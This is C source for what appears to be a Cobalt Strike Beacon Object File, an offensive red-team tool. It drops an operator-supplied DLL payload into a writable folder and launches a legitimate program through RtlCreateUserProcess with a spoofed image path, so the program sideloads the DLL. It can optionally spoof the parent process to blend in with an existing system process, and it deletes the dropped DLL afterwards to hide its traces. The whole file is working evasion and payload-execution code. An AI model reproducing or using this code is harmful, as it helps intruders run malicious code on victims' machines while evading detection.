#include "bofdefs.h"

#define STATUS_SUCCESS 0x00000000

BOOL IsProcessElevated() //Check to see if current process is elevated
{
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize);
	CloseHandle(hToken);

	return elevation.TokenIsElevated; 
}

HANDLE find_process_by_name(const wchar_t* processname) //Find PID of specified process.
{
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    HANDLE hResult = NULL;
    DWORD procSession = 0;
    DWORD targetSession = 0;
    BOOL highpriv = IsProcessElevated();

    //Get session of calling process
    ProcessIdToSessionId(GetCurrentProcessId(), &procSession);

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnap) return(hResult);
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process and exit if unsuccessful
    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);          // clean the snapshot object
        return(hResult);
    }
    do
    {   
        if (0 == wcscmp((wchar_t*)processname, pe32.szExeFile))
        {
            //Get session of matching target process
            ProcessIdToSessionId(pe32.th32ProcessID, &targetSession);

            if((targetSession == procSession && !highpriv) || (targetSession == 0 && highpriv))
            {    
                hResult = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
                if(hResult)
                    break;
            }
        }
    } while (Process32NextW(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return hResult;
}


void go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    
    int dllLen;
    HANDLE hParent = NULL;
    wchar_t hijacklocation[MAX_PATH] = {0};
    wchar_t dllpath[MAX_PATH] = {0};

    //Extract beacon args
    char* dllpayload = BeaconDataExtract(&parser, &dllLen);
    wchar_t* dllname = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* program = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* commandlineargs = (wchar_t*)BeaconDataExtract(&parser, NULL);  
    wchar_t* writablefolder = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* parentname = (wchar_t*)BeaconDataExtract(&parser, NULL);

    //Retrieve a handle to parent process for PPID spoofing if one was supplied
    if(wcslen(parentname) > 0)
    {
        hParent = find_process_by_name(parentname);
        if(!hParent)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to find a %ls process that can be used for PPID spoofing. Aborting", parentname);
            return;
        }
    }

    //If no string was sent for hijacklocation (or a '.' placeholder), we are going to try and write to the current working directory
    if(wcslen(writablefolder) == 0 || wcscmp(writablefolder, L".\\") == 0)
    {
        if(GetCurrentDirectoryW(MAX_PATH, hijacklocation) == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve current directory");
            return;
        }
        else
            wcscat_s(hijacklocation, MAX_PATH, L"\\");
    }
    //Otherwise just copy writable location string into hijacklocation
    else
        wcscat_s(hijacklocation, MAX_PATH, writablefolder);

    //Assemble dllpath
    swprintf_s(dllpath, MAX_PATH, L"%ls%ls", hijacklocation, dllname);

    //Try and create DLL on disk. CREATE_NEW flag so we aren't at risk of deleting the real DLL if we happen to be in the same dir
    HANDLE hFile = CreateFileW(dllpath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    
    //If file creation succeeds, write DLL payload to disk
    if(hFile != INVALID_HANDLE_VALUE)
    {
        DWORD bytesWritten;
        WriteFile(hFile, dllpayload, dllLen, &bytesWritten, NULL);
        CloseHandle(hFile);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Cannot write DLL to disk! Do you have write permissions for %ls?", hijacklocation);
        return;
    }

	// Path to the image file from which the process will be created
	UNICODE_STRING NtImagePath;
	UNICODE_STRING SpoofedPath;
	UNICODE_STRING CommandLine;
    UNICODE_STRING CurrentDirectory;

    //Convert program name to NtPathName
	if (!RtlDosPathNameToNtPathName_U(program, &NtImagePath, NULL, NULL))
	{
		BeaconPrintf(CALLBACK_OUTPUT, "\nError: Unable to convert path name\n");
		goto cleanup;
	}

	//Parse out program name and increment pointer by one to skip the leading backslash
    wchar_t *procname = wcsrchr(program, L'\\') + 1;

    //We are going to parse through supplied program and find + replace sysnative with system32 if it exists
    //Sysnative is required in order to spawn x64 process from x86, but we want the commandline and current directory to reflect system32 not sysnative
    wchar_t clprogram[MAX_PATH] = {0};
    wchar_t* find = L"sysnative";
    wchar_t* replace = L"System32";
    memcpy(clprogram, program, wcslen(program) * sizeof(wchar_t));
    wchar_t *p = StrStrIW(clprogram, find);
    if (p != NULL) {
        size_t len1 = wcslen(find);
        size_t len2 = wcslen(replace);
        if (len1 != len2)
            memmove(p + len2, p + len1, (wcslen(p + len1) * sizeof(wchar_t)) + 1);
        memcpy(p, replace, len2 * sizeof(wchar_t));
    }

    //Assemble spoofed path for process parameters
    wchar_t spath[MAX_PATH] = {0};
    swprintf_s(spath, MAX_PATH, L"%ls%ls", hijacklocation, procname);
	RtlInitUnicodeString(&SpoofedPath, spath);

    //Assemble commandline args for process parameters
    wchar_t cline[MAX_PATH] = {0};
    swprintf_s(cline, MAX_PATH, L"%ls%ls", clprogram, commandlineargs);
	RtlInitUnicodeString(&CommandLine, cline);

    //Assemble current directory for process parameters
    wchar_t currdir[MAX_PATH] = {0};
    memcpy(currdir, clprogram, (wcslen(clprogram) - wcslen(procname)) * sizeof(wchar_t));
    RtlInitUnicodeString(&CurrentDirectory, currdir);

/*     BeaconPrintf(CALLBACK_OUTPUT, "Unicode ntimagepath buffer is: %ls", NtImagePath.Buffer);
    BeaconPrintf(CALLBACK_OUTPUT, "Unicode path buffer is: %ls", SpoofedPath.Buffer);
    BeaconPrintf(CALLBACK_OUTPUT, "Unicode commandline buffer is: %ls", CommandLine.Buffer);
    BeaconPrintf(CALLBACK_OUTPUT, "Unicode currdir buffer is: %ls", CurrentDirectory.Buffer); */

	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RTL_USER_PROCESS_INFORMATION ProcessInfo;

    //Create parameters

    NTSTATUS ntresult = RtlCreateProcessParameters(&ProcessParameters, &SpoofedPath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL);
    if(ntresult != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "RtlCreateProcessParameters failed: %X. Cleaning up and aborting.", ntresult);
        goto cleanup;
    }

    //Create process
	ntresult = RtlCreateUserProcess(&NtImagePath, OBJ_CASE_INSENSITIVE, ProcessParameters, NULL, NULL, hParent, FALSE, NULL, NULL, &ProcessInfo);
    if(ntresult != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "RtlCreateUserProcess failed: %X. Cleaning up and aborting.", ntresult);
        goto cleanup;
    }

    //Resume thread in process
	NtResumeThread(ProcessInfo.Thread, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "Successfully spawned %ls with PID %d\n", procname, GetProcessId(ProcessInfo.Process));

cleanup:
    //Cleanup handles and process parameters
    if(ProcessParameters)
        RtlDestroyProcessParameters(ProcessParameters);
    if(ProcessInfo.Thread)
        CloseHandle(ProcessInfo.Thread);
    if(ProcessInfo.Thread)
        CloseHandle(ProcessInfo.Process);
    if(hParent)
        CloseHandle(hParent);

    //Wait a few seconds and then check to see if DLL payload still exists + inform operator if so
    Sleep(5000);
    
    if(GetFileAttributesW(dllpath) == INVALID_FILE_ATTRIBUTES)
        BeaconPrintf(CALLBACK_OUTPUT, "%ls was successfully deleted from disk!", dllpath);
    else
    {
        if(DeleteFileW(dllpath))
            BeaconPrintf(CALLBACK_OUTPUT, "%ls was successfully deleted from disk!", dllpath);
        else
            BeaconPrintf(CALLBACK_ERROR, "%ls was not successfully deleted! You'll need to manually clean it up.", dllpath);
    }
}
